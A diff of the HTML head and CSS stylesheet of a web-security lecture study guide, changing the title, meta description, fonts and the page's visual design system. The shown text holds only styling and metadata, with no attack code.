@@ -3,416 +3,699 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ELEC3609 Week 7 Study Guide – Web Security &amp; Vulnerability Mitigation · 2025 Session</title>
-<meta name="description" content="This lecture explains how websites get hacked, the mindset that causes security failures, and the major classes of web attack: SQL injection, cross-site scripting, cross-site…">
-<meta name="color-scheme" content="light dark">
+<meta name="description" content="A tour of the attacks that break real websites — SQL injection, cross-site scripting, CSRF, file inclusion, remote code execution and DDoS — and the defensive techniques that stop them: input sanitisa">
+<title>ELEC3609 Week 7 — Web Security: How Sites Get Hacked and How We Defend Them</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Sora:wght@600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600;9..144,700&amp;family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap" rel="stylesheet">
 <style>
-*,*::before,*::after{box-sizing:border-box}
-:root{
-  --sans:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
-  --head:'Sora','Inter',system-ui,sans-serif;
-  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
-  --bg:#f4f8f7;--bg-2:#e9f1ef;--surface:#ffffff;--surface-2:#eff5f4;
-  --ink:#15282b;--muted:#587076;--faint:#89a0a3;--line:#d8e5e2;
-  --brand:#0e7c6b;--brand-2:#12a594;--brand-soft:#d6f3ec;--brand-ink:#0a5b4e;
-  --amber:#b45309;--amber-soft:#fdf0d6;
-  --rose:#b21e4b;--rose-soft:#fde4ec;
-  --sky:#0c6ea3;--sky-soft:#ddeffb;
-  --violet:#6d28d9;--violet-soft:#ece7fd;
-  --shadow:0 1px 2px rgba(16,40,43,.05),0 10px 28px -16px rgba(16,40,43,.30);
-  --shadow-lg:0 26px 60px -30px rgba(16,40,43,.45);
-  --r:16px;--r-sm:11px;--sidebar:288px;
-}
-[data-theme=dark]{
-  --bg:#07110f;--bg-2:#0b1a17;--surface:#0e1d1a;--surface-2:#122522;
-  --ink:#e6f2ef;--muted:#94ada8;--faint:#69837e;--line:#1c322e;
-  --brand:#2dd4bf;--brand-2:#5eead4;--brand-soft:rgba(45,212,191,.15);--brand-ink:#99f6e4;
-  --amber:#fbbf24;--amber-soft:rgba(251,191,36,.15);
-  --rose:#fb7185;--rose-soft:rgba(251,113,133,.15);
-  --sky:#38bdf8;--sky-soft:rgba(56,189,248,.15);
-  --violet:#a78bfa;--violet-soft:rgba(167,139,250,.17);
-  --shadow:0 1px 2px rgba(0,0,0,.35),0 12px 32px -18px rgba(0,0,0,.7);
-  --shadow-lg:0 28px 70px -34px rgba(0,0,0,.85);
-}
-html{scroll-behavior:smooth}
-body{margin:0;font-family:var(--sans);background:var(--bg);color:var(--ink);line-height:1.68;-webkit-font-smoothing:antialiased}
-body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.75;
-  background:radial-gradient(58rem 38rem at 112% -12%,var(--brand-soft),transparent 62%),
-             radial-gradient(46rem 30rem at -12% 6%,var(--sky-soft),transparent 58%)}
-h1,h2,h3,h4{font-family:var(--head);line-height:1.2;margin:0}
-p{margin:0 0 .85rem}
-a{color:var(--brand);text-decoration:none}
-a:hover{text-decoration:underline}
-strong{font-weight:650;color:var(--ink)}
-code{font-family:var(--mono);font-size:.86em;background:var(--surface-2);border:1px solid var(--line);border-radius:6px;padding:.08em .38em}
-.math{font-family:var(--mono);background:var(--surface-2);border:1px solid var(--line);border-radius:6px;padding:.06em .4em;font-size:.9em}
-::selection{background:var(--brand-soft);color:var(--brand-ink)}
-/* progress */
-.progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:60;background:linear-gradient(90deg,var(--brand),var(--brand-2),var(--sky))}
-/* topbar */
-.topbar{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:.75rem;
-  padding:.6rem clamp(.9rem,3vw,1.6rem);background:color-mix(in srgb,var(--surface) 82%,transparent);
-  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
-.brand{display:flex;align-items:center;gap:.6rem;min-width:0}
-.brand-badge{flex:none;font-size:.68rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;
-  color:var(--brand-ink);background:var(--brand-soft);border-radius:999px;padding:.28rem .6rem;white-space:nowrap}
-.brand-title{font-weight:600;font-size:.92rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.topbar-actions{margin-left:auto;display:flex;align-items:center;gap:.45rem}
-.icon-btn{display:inline-grid;place-items:center;width:38px;height:38px;border:1px solid var(--line);
-  background:var(--surface);color:var(--ink);border-radius:10px;cursor:pointer;font-size:1rem;transition:.15s}
-.icon-btn:hover{border-color:var(--brand);color:var(--brand)}
-.menu-btn{display:none}
-.search{position:relative}
-.search input{width:min(30vw,240px);padding:.5rem .7rem;border:1px solid var(--line);border-radius:10px;
-  background:var(--surface);color:var(--ink);font:inherit;font-size:.85rem}
-.search input:focus{outline:2px solid var(--brand-soft);border-color:var(--brand)}
-.search-results{position:absolute;right:0;top:calc(100% + 8px);width:min(78vw,380px);max-height:60vh;overflow:auto;
-  background:var(--surface);border:1px solid var(--line);border-radius:12px;box-shadow:var(--shadow-lg);display:none;padding:.35rem}
-.search-results.open{display:block}
-.sr-item{display:block;width:100%;text-align:left;border:0;background:none;color:var(--ink);font:inherit;
-  padding:.5rem .6rem;border-radius:8px;cursor:pointer}
-.sr-item:hover,.sr-item.active{background:var(--surface-2)}
-.sr-item b{display:block;font-size:.84rem;color:var(--brand-ink)}
-.sr-item span{display:block;font-size:.76rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.sr-empty{padding:.6rem;color:var(--muted);font-size:.82rem}
-/* shell */
-.shell{display:grid;grid-template-columns:var(--sidebar) minmax(0,1fr);gap:0;align-items:start}
-.sidebar{position:sticky;top:57px;height:calc(100vh - 57px);overflow:auto;padding:1.3rem .9rem 3rem 1.4rem}
-.toc-title{font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);font-weight:700;margin:0 0 .7rem .5rem}
-.toc{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:1px}
-.toc-link{display:flex;gap:.55rem;align-items:baseline;padding:.36rem .5rem;border-radius:8px;color:var(--muted);
-  font-size:.82rem;line-height:1.35;transition:.13s}
-.toc-link:hover{background:var(--surface-2);color:var(--ink);text-decoration:none}
-.toc-link.active{background:var(--brand-soft);color:var(--brand-ink);font-weight:600}
-.toc-n{font-family:var(--mono);font-size:.66rem;color:var(--faint);flex:none;padding-top:.12rem}
-.toc-link.active .toc-n{color:var(--brand)}
-.content{min-width:0;max-width:960px;padding:1.6rem clamp(1rem,3.5vw,2.6rem) 5rem}
-/* hero */
-.hero{position:relative;overflow:hidden;border:1px solid var(--line);border-radius:var(--r);
-  padding:clamp(1.4rem,3.5vw,2.4rem);background:
-    linear-gradient(180deg,color-mix(in srgb,var(--brand-soft) 55%,var(--surface)),var(--surface) 72%);
-  box-shadow:var(--shadow);margin-bottom:2rem}
-.hero::after{content:"";position:absolute;right:-70px;top:-70px;width:230px;height:230px;border-radius:50%;
-  background:radial-gradient(circle,var(--brand-soft),transparent 68%);opacity:.8}
-.hero-tag{font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--brand-ink);font-weight:700;margin:0 0 .55rem}
-.hero h1{font-size:clamp(1.5rem,4vw,2.15rem);letter-spacing:-.02em;margin-bottom:.5rem}
-.hero-sub{color:var(--muted);font-size:1.02rem;max-width:60ch;margin-bottom:1.1rem}
-.hero-overview{position:relative;background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);
-  padding:1rem 1.15rem;box-shadow:var(--shadow)}
-.ho-label{font-size:.68rem;letter-spacing:.12em;text-transform:uppercase;color:var(--faint);font-weight:700;margin:0 0 .35rem}
-.hero-overview p:last-child{margin:0}
-.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.7rem;margin-top:1.1rem}
-.stat{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);padding:.7rem .85rem;box-shadow:var(--shadow)}
-.stat-val{display:block;font-family:var(--head);font-weight:800;font-size:1.25rem;color:var(--brand-ink)}
-.stat-label{display:block;font-size:.72rem;color:var(--muted);letter-spacing:.03em;text-transform:uppercase;font-weight:600}
-/* sections */
-.section{scroll-margin-top:80px;margin-bottom:2.4rem;opacity:0;transform:translateY(14px);transition:opacity .5s ease,transform .5s ease}
-.section.in{opacity:1;transform:none}
-.section-head{display:flex;align-items:center;gap:.75rem;margin-bottom:1rem;padding-bottom:.6rem;border-bottom:2px solid var(--line)}
-.section-num{flex:none;font-family:var(--head);font-weight:800;font-size:.82rem;color:#fff;background:linear-gradient(135deg,var(--brand),var(--brand-2));
-  width:2.1rem;height:2.1rem;display:grid;place-items:center;border-radius:10px;box-shadow:0 6px 16px -8px var(--brand)}
-.section-head h2{font-size:clamp(1.15rem,2.6vw,1.5rem);letter-spacing:-.01em}
-.section-body>*+*{margin-top:.5rem}
-.section-body p{margin:0 0 .9rem}
-.subhead{font-size:.98rem;margin:1.2rem 0 .5rem;color:var(--brand-ink)}
-ul,ol{margin:0 0 .9rem;padding-left:1.25rem}
-li{margin:.22rem 0}
-li>ul,li>ol{margin:.3rem 0 .1rem}
-/* table */
-.table-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:var(--r-sm);margin:1rem 0;box-shadow:var(--shadow)}
-table{border-collapse:collapse;width:100%;font-size:.88rem;min-width:440px}
-thead th{background:var(--surface-2);text-align:left;font-weight:700;color:var(--ink);white-space:nowrap}
-th,td{padding:.6rem .8rem;border-bottom:1px solid var(--line);vertical-align:top}
-tbody tr:last-child td{border-bottom:0}
-tbody tr:nth-child(even){background:color-mix(in srgb,var(--surface-2) 45%,transparent)}
-/* code */
-.code{position:relative;margin:1rem 0}
-.code pre{margin:0;background:var(--surface-2);border:1px solid var(--line);border-radius:var(--r-sm);
-  padding:1rem 1.1rem;overflow:auto;box-shadow:var(--shadow)}
-.code code{font-family:var(--mono);font-size:.82rem;line-height:1.6;background:none;border:0;padding:0;color:var(--ink);white-space:pre}
-.copy{position:absolute;top:.55rem;right:.55rem;font-size:.68rem;letter-spacing:.04em;text-transform:uppercase;font-weight:700;
-  color:var(--muted);background:var(--surface);border:1px solid var(--line);border-radius:7px;padding:.24rem .5rem;cursor:pointer}
-.copy:hover{color:var(--brand);border-color:var(--brand)}
-.copy.done{color:var(--brand-ink);border-color:var(--brand)}
-/* formula */
-.formula{position:relative;margin:1rem 0;padding:1.1rem 1rem .9rem;background:var(--surface-2);border:1px solid var(--line);border-radius:var(--r-sm)}
-.formula-label{position:absolute;top:-.6rem;left:.9rem;font-size:.66rem;letter-spacing:.07em;text-transform:uppercase;font-weight:700;
-  color:#fff;background:var(--brand);border-radius:6px;padding:.14rem .5rem}
-.formula code{display:block;font-family:var(--mono);font-size:.86rem;background:none;border:0;padding:0;color:var(--ink)}
-/* flow */
-.flow{display:flex;flex-wrap:wrap;align-items:center;gap:.45rem;margin:1rem 0;padding:1rem;background:var(--surface);
-  border:1px solid var(--line);border-radius:var(--r-sm);box-shadow:var(--shadow)}
-.flow-step{display:inline-flex;align-items:center;gap:.4rem;background:var(--surface-2);border:1px solid var(--line);
-  border-radius:999px;padding:.34rem .75rem .34rem .5rem;font-size:.82rem;font-weight:600}
-.flow-n{font-family:var(--mono);font-size:.64rem;color:#fff;background:var(--brand);border-radius:999px;padding:.1rem .34rem}
-.flow-arrow{color:var(--brand);font-weight:800}
-/* callouts */
-.callout{display:flex;gap:.75rem;margin:1rem 0;padding:.9rem 1rem;border:1px solid var(--line);border-left-width:4px;
-  border-radius:var(--r-sm);background:var(--surface);box-shadow:var(--shadow)}
-.callout-ico{flex:none;font-size:1.15rem;line-height:1.3}
-.callout-title{font-weight:700;font-size:.78rem;letter-spacing:.05em;text-transform:uppercase;margin:0 0 .18rem}
-.callout-text{font-size:.93rem}
-.callout-text>:last-child{margin-bottom:0}
-.callout.why{border-left-color:var(--amber);background:color-mix(in srgb,var(--amber-soft) 55%,var(--surface))}
-.callout.why .callout-title{color:var(--amber)}
-.callout.memory{border-left-color:var(--violet);background:color-mix(in srgb,var(--violet-soft) 55%,var(--surface))}
-.callout.memory .callout-title{color:var(--violet)}
-.callout.warn{border-left-color:var(--rose);background:color-mix(in srgb,var(--rose-soft) 55%,var(--surface))}
-.callout.warn .callout-title{color:var(--rose)}
-.callout.info{border-left-color:var(--sky);background:color-mix(in srgb,var(--sky-soft) 55%,var(--surface))}
-.callout.info .callout-title{color:var(--sky)}
-.callout.tip{border-left-color:var(--brand);background:color-mix(in srgb,var(--brand-soft) 55%,var(--surface))}
-.callout.tip .callout-title{color:var(--brand-ink)}
-/* takeaways */
-.takeaways{list-style:none;margin:0;padding:0;display:grid;gap:.6rem}
-.takeaways li{display:flex;gap:.7rem;align-items:flex-start;background:var(--surface);border:1px solid var(--line);
-  border-radius:var(--r-sm);padding:.75rem .9rem;box-shadow:var(--shadow)}
-.tk-n{flex:none;font-family:var(--mono);font-size:.68rem;font-weight:700;color:var(--brand-ink);background:var(--brand-soft);
-  border-radius:7px;padding:.22rem .45rem;margin-top:.15rem}
-/* glossary */
-.term-filter{display:flex;align-items:center;gap:.7rem;margin:0 0 .9rem}
-.term-filter input{flex:1;max-width:340px;padding:.55rem .75rem;border:1px solid var(--line);border-radius:10px;background:var(--surface);color:var(--ink);font:inherit;font-size:.86rem}
-.term-filter input:focus{outline:2px solid var(--brand-soft);border-color:var(--brand)}
-.term-count{font-size:.78rem;color:var(--muted)}
-.terms{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:.7rem}
-.term{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);padding:.8rem .9rem;box-shadow:var(--shadow)}
-.term.hide{display:none}
-.term-name{font-family:var(--head);font-weight:700;font-size:.9rem;margin:0 0 .2rem;color:var(--brand-ink)}
-.term-def{font-size:.85rem;color:var(--muted);margin:0}
-/* mnemonics */
-.mnemonics{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:.8rem}
-.mnemonic{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);padding:.95rem 1rem;box-shadow:var(--shadow)}
-.mn-title{font-family:var(--head);font-weight:700;font-size:.92rem;margin:0 0 .4rem;color:var(--brand-ink)}
-.mn-code{font-family:var(--mono);font-weight:600;font-size:1.02rem;letter-spacing:.04em;margin:0 0 .35rem}
-.mn-phrase{font-style:italic;font-weight:600;color:var(--violet);margin:0 0 .35rem}
-.mn-note{font-size:.83rem;color:var(--muted);margin:0}
-/* examples */
-.example{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:1.1rem 1.2rem;margin:0 0 1rem;box-shadow:var(--shadow)}
-.example-tag{display:inline-block;font-size:.66rem;letter-spacing:.08em;text-transform:uppercase;font-weight:700;
-  color:var(--brand-ink);background:var(--brand-soft);border-radius:999px;padding:.2rem .55rem;margin-bottom:.5rem}
-.example-title{font-size:1rem;margin:0 0 .6rem}
-/* exam */
-.exam-bar{display:flex;flex-wrap:wrap;gap:.8rem;align-items:center;justify-content:space-between;
-  background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);padding:.8rem 1rem;margin:0 0 1rem;box-shadow:var(--shadow)}
-.exam-count{font-size:.85rem;color:var(--muted)}
-.exam-count strong{color:var(--brand-ink)}
-.exam-track{display:block;width:170px;height:7px;border-radius:999px;background:var(--surface-2);margin-top:.4rem;overflow:hidden}
-.exam-track>span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),var(--brand-2));transition:width .3s}
-.exam-actions{display:flex;gap:.4rem;flex-wrap:wrap}
-.btn{font:inherit;font-size:.78rem;font-weight:600;color:var(--brand-ink);background:var(--brand-soft);border:1px solid transparent;
-  border-radius:9px;padding:.42rem .7rem;cursor:pointer}
-.btn:hover{background:var(--brand);color:#fff}
-.btn.ghost{background:transparent;border-color:var(--line);color:var(--muted)}
-.btn.ghost:hover{border-color:var(--brand);color:var(--brand);background:transparent}
-.quiz{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-sm);margin:0 0 .6rem;overflow:hidden;box-shadow:var(--shadow)}
-.quiz-q{display:flex;gap:.7rem;align-items:flex-start;width:100%;text-align:left;background:none;border:0;color:var(--ink);
-  font:inherit;font-weight:600;padding:.85rem .95rem;cursor:pointer}
-.quiz-n{flex:none;font-family:var(--mono);font-size:.7rem;font-weight:700;color:#fff;background:var(--brand);border-radius:7px;padding:.2rem .45rem;margin-top:.1rem}
-.quiz-text{flex:1}
-.quiz-chev{flex:none;color:var(--muted);transition:transform .2s}
-.quiz.open .quiz-chev{transform:rotate(180deg)}
-.quiz-body{display:none;padding:0 .95rem .9rem;border-top:1px dashed var(--line)}
-.quiz.open .quiz-body{display:block}
-.quiz-a{font-size:.9rem;margin:.7rem 0;padding:.7rem .85rem;background:var(--surface-2);border-radius:9px}
-.quiz-a-label{display:block;font-size:.66rem;letter-spacing:.08em;text-transform:uppercase;font-weight:700;color:var(--brand);margin-bottom:.2rem}
-.quiz-a.muted{color:var(--muted);font-style:italic}
-.mastered{display:inline-flex;gap:.45rem;align-items:center;font-size:.8rem;color:var(--muted);cursor:pointer;user-select:none}
-.mastered input{accent-color:var(--brand);width:1rem;height:1rem}
-/* footer */
-.foot{margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--line);color:var(--muted);font-size:.82rem}
-/* to top */
-.totop{position:fixed;right:1.1rem;bottom:1.1rem;z-index:55;width:42px;height:42px;border-radius:12px;border:1px solid var(--line);
-  background:var(--surface);color:var(--brand-ink);font-size:1.1rem;cursor:pointer;box-shadow:var(--shadow-lg);opacity:0;pointer-events:none;transition:.2s}
-.totop.show{opacity:1;pointer-events:auto}
-.scrim{display:none}
-/* responsive */
-@media (max-width:980px){
-  .shell{grid-template-columns:1fr}
-  .menu-btn{display:inline-grid}
-  .sidebar{position:fixed;top:0;left:0;z-index:70;height:100vh;width:min(86vw,320px);background:var(--surface);
-    border-right:1px solid var(--line);transform:translateX(-102%);transition:transform .25s ease;padding-top:1.4rem;box-shadow:var(--shadow-lg)}
-  .sidebar.open{transform:none}
-  .scrim{display:block;position:fixed;inset:0;z-index:65;background:rgba(6,18,16,.45);opacity:0;pointer-events:none;transition:.25s}
-  .scrim.show{opacity:1;pointer-events:auto}
-  .search input{width:40vw}
-  .brand-title{display:none}
-}
-@media (max-width:560px){
-  .search input{width:34vw}
-  .content{padding:1.1rem .9rem 4rem}
-  .stats{grid-template-columns:repeat(auto-fit,minmax(120px,1fr))}
-}
-@media (prefers-reduced-motion:reduce){
-  *{scroll-behavior:auto!important}
-  .section{opacity:1;transform:none;transition:none}
-}
-@media print{
-  .topbar,.sidebar,.totop,.progress,.exam-actions,.copy,.scrim,.term-filter{display:none!important}
-  body::before{display:none}
-  .shell{display:block}
-  .content{max-width:none;padding:0}
-  .section{opacity:1;transform:none;page-break-inside:avoid}
-  .quiz-body{display:block!important}
-  .hero,.callout,.table-wrap,.code pre,.example,.quiz,.term{box-shadow:none}
-  a{color:inherit}
-}
+  /* ============================================================
+     ENGG2112 Study Guides — "Calm Canvas" design system
+     Warm paper light theme + soft night theme, editorial type,
+     guided reading flow, active-recall components.
+     Light theme is default; night theme via [data-theme="dark"].
+     ============================================================ */
+  :root{
+    --font-display:'Fraunces', Georgia, 'Times New Roman', serif;
+    --font-body:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    --font-mono:'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, monospace;
+
+    /* Surfaces */
+    --paper:#f4f1ea;
+    --surface:#fffdf9;
+    --surface-2:#f8f4ec;
+    --surface-3:#efe9de;
+    --ink:#33302b;
+    --ink-soft:#5d574e;
+    --ink-faint:#8b8377;
+    --line:#e6dfd3;
+    --line-strong:#d7cdbc;
+
+    /* Brand palette (muted, low-glare) */
+    --primary:#3f7d74;
+    --primary-deep:#2c5d56;
+    --primary-soft:#e3efeb;
+    --accent:#b4663f;
+    --accent-soft:#f7e8e0;
+    --gold:#9c7a28;
+    --gold-soft:#f6efdc;
+    --violet:#6c60ab;
+    --violet-soft:#ece9f7;
+    --blue:#3f6f8e;
+    --blue-soft:#e7f0f5;
+    --rose:#ab4f55;
+    --rose-soft:#f8e8e9;
+
+    /* Semantic callout tokens */
+    --c-info-bg:var(--blue-soft);      --c-info-line:#c6dbe8;  --c-info-fg:#2f5d79;
+    --c-why-bg:var(--gold-soft);       --c-why-line:#e8dbb4;   --c-why-fg:#7d6220;
+    --c-memory-bg:var(--violet-soft);  --c-memory-line:#d6cff0;--c-memory-fg:#574c94;
+    --c-tip-bg:var(--primary-soft);    --c-tip-line:#c2ded6;   --c-tip-fg:#2c5d56;
+    --c-warn-bg:var(--rose-soft);      --c-warn-line:#ecccce;  --c-warn-fg:#8f3f45;
+
+    --radius:18px;
+    --radius-sm:11px;
+    --shadow-sm:0 1px 2px rgba(60,50,40,.05);
+    --shadow:0 8px 24px -12px rgba(60,50,40,.22);
+    --shadow-lg:0 24px 60px -28px rgba(60,50,40,.35);
+    --sidebar-w:300px;
+    --measure:76ch;
+    --ease:cubic-bezier(.22,.61,.36,1);
+  }
+  html[data-theme="dark"]{
+    --paper:#171614;
+    --surface:#201e1b;
+    --surface-2:#262320;
+    --surface-3:#2e2b26;
+    --ink:#ece7df;
+    --ink-soft:#bdb6ab;
+    --ink-faint:#8d867b;
+    --line:#37332d;
+    --line-strong:#484239;
+
+    --primary:#7fc3b4;
+    --primary-deep:#a5d8cc;
+    --primary-soft:#21322e;
+    --accent:#e0a07b;
+    --accent-soft:#33241d;
+    --gold:#e0c183;
+    --gold-soft:#332b1a;
+    --violet:#b3a9e6;
+    --violet-soft:#282343;
+    --blue:#9cc4dc;
+    --blue-soft:#1e2c36;
+    --rose:#e6a3a8;
+    --rose-soft:#362223;
+
+    --c-info-bg:#1e2c36;      --c-info-line:#2d4354;  --c-info-fg:#a9cfe4;
+    --c-why-bg:#332b1a;       --c-why-line:#4a3f24;   --c-why-fg:#e3c98d;
+    --c-memory-bg:#282343;    --c-memory-line:#3c3563;--c-memory-fg:#bdb3ec;
+    --c-tip-bg:#21322e;       --c-tip-line:#2f4a43;   --c-tip-fg:#93cec1;
+    --c-warn-bg:#362223;      --c-warn-line:#4d3032;  --c-warn-fg:#e6adb1;
+
+    --shadow-sm:0 1px 2px rgba(0,0,0,.3);
+    --shadow:0 10px 28px -14px rgba(0,0,0,.6);
+    --shadow-lg:0 26px 65px -30px rgba(0,0,0,.75);
+  }
+
+  *,*::before,*::after{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--paper);
+    color:var(--ink);
+    font-family:var(--font-body);
+    font-size:16.5px;
+    line-height:1.72;
+    -webkit-font-smoothing:antialiased;
+    text-rendering:optimizeLegibility;
+  }
+  ::selection{background:var(--primary-soft);color:var(--ink);}
+  a{color:var(--primary-deep);text-decoration:none;}
+  a:hover{text-decoration:underline;}
+  p{margin:0 0 1.05rem;}
+  strong{font-weight:650;color:var(--ink);}
+  img{max-width:100%;height:auto;}
+
+  .skip-link{
+    position:absolute;left:-9999px;top:0;z-index:200;
+    background:var(--surface);padding:.6rem 1rem;border-radius:0 0 var(--radius-sm) 0;
+  }
+  .skip-link:focus{left:0;}
+
+  /* ---------- Reading progress ---------- */
+  .progress-track{position:fixed;inset:0 0 auto 0;height:3px;background:transparent;z-index:120;}
+  .progress-fill{
+    height:100%;width:0;
+    background:linear-gradient(90deg,var(--primary),var(--accent));
+    transition:width .12s linear;
+  }
+
+  /* ---------- Top bar ---------- */
+  .topbar{
+    position:sticky;top:0;z-index:100;
+    display:flex;align-items:center;gap:.9rem;
+    height:62px;padding:0 clamp(.8rem,3vw,1.6rem);
+    background:color-mix(in srgb, var(--paper) 82%, transparent);
+    backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line);
+  }
+  .icon-btn{
+    display:inline-flex;align-items:center;justify-content:center;
+    width:40px;height:40px;flex:0 0 auto;
+    border:1px solid var(--line);border-radius:11px;
+    background:var(--surface);color:var(--ink-soft);
+    font-size:1.05rem;cursor:pointer;transition:.18s var(--ease);
+  }
+  .icon-btn:hover{border-color:var(--line-strong);color:var(--ink);transform:translateY(-1px);}
+  .menu-toggle{display:none;}
+  .brand{display:flex;align-items:baseline;gap:.55rem;white-space:nowrap;}
+  .brand:hover{text-decoration:none;}
+  .brand-course{font-family:var(--font-display);font-weight:600;font-size:1.12rem;color:var(--ink);letter-spacing:-.01em;}
+  .brand-week{font-size:.74rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--primary-deep);background:var(--primary-soft);padding:.2rem .55rem;border-radius:999px;}
+  .topbar-tools{margin-left:auto;display:flex;align-items:center;gap:.55rem;}
+  .search{position:relative;display:flex;align-items:center;}
+  .search-icon{position:absolute;left:.7rem;color:var(--ink-faint);font-size:1rem;pointer-events:none;}
+  .search input{
+    width:min(40vw,270px);padding:.55rem .8rem .55rem 2.1rem;
+    border:1px solid var(--line);border-radius:999px;
+    background:var(--surface);color:var(--ink);font-family:inherit;font-size:.9rem;
+    outline:none;transition:.2s var(--ease);
+  }
+  .search input:focus{border-color:var(--primary);box-shadow:0 0 0 4px var(--primary-soft);}
+  .suggest{
+    position:absolute;top:calc(100% + .5rem);right:0;width:min(86vw,340px);max-height:60vh;overflow:auto;
+    background:var(--surface);border:1px solid var(--line);border-radius:var(--radius-sm);box-shadow:var(--shadow-lg);
+    padding:.4rem;display:none;z-index:110;
+  }
+  .suggest.open{display:block;}
+  .suggest a{display:block;padding:.5rem .6rem;border-radius:8px;font-size:.88rem;color:var(--ink-soft);}
+  .suggest a:hover{background:var(--surface-2);text-decoration:none;color:var(--ink);}
+  .suggest .none{padding:.6rem;color:var(--ink-faint);font-size:.85rem;}
+
+  /* ---------- Layout ---------- */
+  .layout{display:grid;grid-template-columns:var(--sidebar-w) minmax(0,1fr);gap:clamp(1.2rem,3vw,3rem);max-width:1280px;margin:0 auto;padding:0 clamp(.9rem,3vw,2rem);}
+  .sidebar{position:sticky;top:62px;align-self:start;height:calc(100vh - 62px);overflow-y:auto;padding:1.6rem 0 3rem;}
+  .sidebar-inner{padding-right:.4rem;}
+  .sidebar-progress{margin-bottom:1.3rem;padding:.85rem .9rem;background:var(--surface);border:1px solid var(--line);border-radius:var(--radius-sm);}
+  .sidebar-progress-label{display:flex;justify-content:space-between;font-size:.74rem;font-weight:600;text-transform:uppercase;letter-spacing:.07em;color:var(--ink-faint);margin-bottom:.5rem;}
+  .bar{height:7px;border-radius:999px;background:var(--surface-3);overflow:hidden;}
+  .bar-fill{height:100%;width:0;background:linear-gradient(90deg,var(--primary),var(--accent));transition:width .3s var(--ease);}
+  .toc-title{font-size:.72rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--ink-faint);margin:0 0 .5rem .2rem;}
+  .toc{display:flex;flex-direction:column;gap:1px;margin-bottom:1.4rem;}
+  .toc a{
+    display:block;padding:.46rem .65rem .46rem .8rem;border-radius:9px;
+    font-size:.875rem;line-height:1.4;color:var(--ink-soft);
+    border-left:2px solid transparent;transition:.15s var(--ease);
+  }
+  .toc a:hover{background:var(--surface-2);text-decoration:none;color:var(--ink);}
+  .toc a.active{background:var(--primary-soft);color:var(--primary-deep);border-left-color:var(--primary);font-weight:600;}
+  .toc a .n{display:inline-block;width:1.5rem;color:var(--ink-faint);font-variant-numeric:tabular-nums;font-size:.78rem;}
+  .toc a.active .n{color:var(--primary-deep);}
+  .sidebar-links{display:flex;flex-direction:column;gap:.35rem;padding-top:1rem;border-top:1px solid var(--line);}
+  .sidebar-links a{font-size:.83rem;color:var(--ink-soft);padding:.25rem .2rem;}
+  .scrim{display:none;}
+
+  .content{max-width:var(--measure);padding:2.4rem 0 4rem;min-width:0;}
+  .content :is(h2,h3,h4){scroll-margin-top:80px;}
+
+  /* ---------- Hero ---------- */
+  .hero{
+    position:relative;overflow:hidden;
+    background:linear-gradient(160deg,var(--surface),var(--surface-2));
+    border:1px solid var(--line);border-radius:calc(var(--radius) + 6px);
+    padding:clamp(1.6rem,4vw,3rem);margin-bottom:2.6rem;box-shadow:var(--shadow);
+  }
+  .hero::after{
+    content:"";position:absolute;right:-90px;top:-90px;width:280px;height:280px;border-radius:50%;
+    background:radial-gradient(circle at 30% 30%,var(--primary-soft),transparent 68%);
+    opacity:.9;pointer-events:none;
+  }
+  .hero-eyebrow{display:inline-flex;align-items:center;gap:.5rem;font-size:.74rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--primary-deep);background:var(--primary-soft);padding:.3rem .7rem;border-radius:999px;margin-bottom:1rem;}
+  .hero-title{font-family:var(--font-display);font-weight:600;font-size:clamp(1.8rem,4.2vw,2.7rem);line-height:1.12;letter-spacing:-.02em;margin:0 0 .7rem;color:var(--ink);}
+  .hero-sub{font-size:clamp(1rem,1.6vw,1.14rem);color:var(--ink-soft);max-width:62ch;margin-bottom:1.3rem;}
+  .hero-lead{background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--primary);border-radius:var(--radius-sm);padding:1rem 1.15rem;font-size:.95rem;color:var(--ink-soft);margin-bottom:1.4rem;}
+  .hero-lead strong{color:var(--ink);}
